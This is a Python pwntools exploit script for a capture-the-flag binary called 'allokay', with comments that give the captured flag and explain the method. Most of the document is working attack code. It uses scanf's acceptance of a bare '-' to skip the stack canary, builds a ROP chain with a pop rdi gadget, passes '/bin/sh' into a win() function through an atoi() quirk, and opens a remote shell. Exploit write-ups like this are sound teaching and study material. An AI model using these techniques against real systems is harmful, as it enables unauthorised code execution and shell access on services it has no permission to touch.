#!/usr/bin/env python3

from pwn import *

HOST = "chals.damctf.xyz"
PORT = 32575

local = False

binary = ELF("./allokay")

if local:
    p = process(binary.path)
else:
    p = remote(HOST, PORT)

# 0x17 is the index on the stack for the return value,
# so overwrite the 24th value

WIN = 0x0400767

rop = ROP(binary)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
SHELL = b"/bin/sh"
SHELL_INT = 0
BUFFER = 0x06010a3

print(hex(POP_RDI))

p.recvline("How many favorite numbers do you have?\n")
 
p.sendline(b'100' + SHELL + b'\00')

for i in range(0x17):
    p.sendline("-")

p.sendline(str(POP_RDI))
p.sendline(str(BUFFER))
p.sendline(str(WIN))

for i in range(100-(0x17 + 3)):
    p.sendline("-")

p.interactive()

# dam{4Re_u_A11_0cK4y}
#
# The solution was, except standard pwn, in 2 steps. The exploit was obvious in the fact that scanf wrote over the stack
# like so: scanf(%ld, stack[i]) in a while loop. The trick was to increment i without overwriting the stack, since
# there was a canary. There were 2 ways to do this, either by noticing that one of the values you could overwrite was
# actually "i", and then overwriting i to skip the canary and then just overwrite the return address. The other solution
# was that scanf(%ld) accepts "+" or "-", since +100 and -100 are valid integers. Thus by only inputting "+",
# scanf accepts it as valid input but since there is no number it has nothing to insert as a value and doesn't do anything.
# This allowed us to gain return control. The other part of the solution was managing to insert "/bin/sh" as a paremeter
# to the win() function which called execv() with our parameter. The trick here was that the main function that
# took in a max value for the loop did this with fgets() and then calling atoi() on the buffer, but atoi() works on strings
# such as "100/bin/sh" and simply returns 100, since PIE wasn't enabled we simply have to give our parameter as buffer[3]
# with buffer being "100/bin/sh\00".#!/usr/bin/env python3